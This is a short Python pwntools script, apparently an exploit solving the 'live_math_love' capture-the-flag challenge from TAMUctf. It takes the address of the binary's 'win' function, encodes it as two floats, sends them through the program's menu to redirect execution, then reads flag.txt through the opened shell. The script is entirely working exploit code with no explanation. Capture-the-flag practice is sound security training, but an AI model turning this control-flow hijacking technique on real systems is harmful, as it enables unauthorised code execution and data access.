from pwn import *
import struct


e = ELF('./live_math_love')
p = remote("tamuctf.com", 443, ssl=True, sni="live-math-love")

win = e.symbols['win']
win_broken = p64(win)
(first,) = struct.unpack('f', win_broken[:4])
(second,) = struct.unpack('f', win_broken[4:])

p.sendline(b'1')
p.sendline('{:.50f}'.format(second).encode('ascii'))
p.sendline('{:.50f}'.format(first).encode('ascii'))
p.sendline(b'4')
p.sendline(b'4')

p.sendline(b'cat flag.txt')
p.interactive()
